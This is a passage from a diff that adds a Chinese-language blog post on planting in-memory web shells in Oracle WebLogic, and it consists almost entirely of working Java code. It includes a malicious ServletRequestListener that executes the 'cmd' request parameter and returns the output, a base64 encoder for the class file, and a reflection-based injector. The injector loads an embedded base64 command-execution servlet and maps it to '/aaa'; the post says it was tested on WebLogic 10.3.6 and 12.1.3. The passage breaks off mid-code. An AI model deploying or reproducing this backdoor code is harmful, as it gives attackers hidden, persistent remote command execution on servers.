+                <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                    <span class="c1">//weblogic1036 可以直接调用registerListener添加
+</span><span class="c1"></span>                    <span class="n">Method</span> <span class="n">listen</span><span class="o">=</span><span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerListener&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                    <span class="n">listen</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">listen</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">,</span><span class="s">&#34;cmdListener&#34;</span><span class="o">);</span>
+                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
+                <span class="o">}</span>
+
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>恶意Listener</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletResponseImpl</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.ServletRequestEvent</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.ServletRequestListener</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">myListener</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+                <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+                <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+                <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
+                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span><span class="c1">//执行结果加上回车
+</span><span class="c1"></span>                <span class="o">}</span>
+                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+                <span class="n">ServletResponseImpl</span> <span class="n">response</span><span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">()).</span><span class="na">getResponse</span><span class="o">();</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>base64脚本，用于编码class文件。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">test1</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">sun.misc.BASE64Encoder</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/Users/myzxcg/xx/IdeaProjects/web/target/classes/com/example/web/myListener.class&#34;</span><span class="o">);</span>
+            <span class="n">FileInputStream</span> <span class="n">fileInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
+            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">4096</span><span class="o">];</span>
+            <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
+            <span class="k">while</span> <span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">fileInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">))!=-</span><span class="n">1</span><span class="o">){</span>
+                <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span><span class="n">0</span><span class="o">,</span><span class="n">len</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;\\r|\\n&#34;</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">));</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="servlet"><a href="#servlet" class="anchor-link">#</a><a href="#contents:servlet" class="headings">Servlet</a></h2>
+<p>只需要在servletMapping中添加URI和对应的URLMatchHelper对象即可。
+<strong>实现代码</strong></p>
+<p>在Weblogic 1036和weblogic 12.1.3测试成功。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletStubImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.utils.ServletMapping</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">guguServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">URI</span> <span class="o">=</span> <span class="s">&#34;/aaa&#34;</span><span class="o">;</span>
+           <span class="c1">//获取servletContext
+</span><span class="c1"></span>            <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
+            <span class="c1">//获取WebAppServletContext
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
+            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
+            <span class="n">WebAppServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span> <span class="c1">//weblogic 12.1.3
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
+                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
+                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
+
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//weblogic 1036
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="c1">// 获取servletMapping
+</span><span class="c1"></span>            <span class="n">Method</span> <span class="n">getServletMapping</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;getServletMapping&#34;</span><span class="o">);</span>
+            <span class="n">getServletMapping</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ServletMapping</span> <span class="n">mappings</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletMapping</span><span class="o">)</span> <span class="n">getServletMapping</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+            <span class="n">ServletStubImpl</span> <span class="n">servletStub</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="c1">// 使用ServletStub包装HttpServlet
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAhwoAHQBDCAArCwBEAEUIAEYKAEcASAoACQBJCABKCgAJAEsHAEwIAE0IAE4IAE8IAFAKAFEAUgoAUQBTCgBUAFUHAFYKABEAVwgAWAoAEQBZCgARAFoKABEAWwgAXAsAXQBeCgBfAGAKAF8AYQoAXwBiBwBjBwBkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MY29tL2V4YW1wbGUvd2ViL2h0dHBTZXJ2bGV0OwEABWRvR2V0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAEwHADEHAGUHAFYBAApFeGNlcHRpb25zBwBmBwBnAQAKU291cmNlRmlsZQEAEGh0dHBTZXJ2bGV0LmphdmEMAB4AHwcAaAwAaQBqAQAHb3MubmFtZQcAawwAbABqDABtAG4BAAN3aW4MAG8AcAEAEGphdmEvbGFuZy9TdHJpbmcBAARiYXNoAQACLWMBAAdjbWQuZXhlAQACL2MHAHEMAHIAcwwAdAB1BwB2DAB3AHgBABFqYXZhL3V0aWwvU2Nhbm5lcgwAHgB5AQACXGEMAHoAewwAfAB9DAB+AG4BAAAHAH8MAIAAgQcAggwAgwCEDACFAB8MAIYAHwEAG2NvbS9leGFtcGxlL3dlYi9odHRwU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAcAB0AAAAAAAIAAQAeAB8AAQAgAAAALwABAAEAAAAFKrcAAbEAAAACACEAAAAGAAEAAAAMACIAAAAMAAEAAAAFACMAJAAAAAQAJQAmAAIAIAAAAYoABAALAAAAoSsSArkAAwIATgQ2BBIEuAAFOgUZBcYAExkFtgAGEge2AAiZAAYDNgQVBJkAGAa9AAlZAxIKU1kEEgtTWQUtU6cAFQa9AAlZAxIMU1kEEg1TWQUtUzoGuAAOGQa2AA+2ABA6B7sAEVkZB7cAEhITtgAUOggZCLYAFZkACxkItgAWpwAFEhc6CSy5ABgBADoKGQoZCbYAGRkKtgAaGQq2ABuxAAAAAwAhAAAAOgAOAAAADwAJABAADAARABMAEgAlABMAKAAVAFYAFgBjABcAcwAYAIcAGQCPABoAlgAbAJsAHACgAB0AIgAAAHAACwAAAKEAIwAkAAAAAAChACcAKAABAAAAoQApACoAAgAJAJgAKwAsAAMADACVAC0ALgAEABMAjgAvACwABQBWAEsAMAAxAAYAYwA+ADIAMwAHAHMALgA0ADUACACHABoANgAsAAkAjwASADcAOAAKADkAAAAhAAX+ACgHADoBBwA6GVEHADv+AC4HADsHADwHAD1BBwA6AD4AAAAGAAIAPwBAAAEAQQAAAAIAQg==&#34;</span><span class="o">;</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
+            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+            <span class="n">Class</span> <span class="n">servlet_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+            <span class="c1">//获取cachedClasses
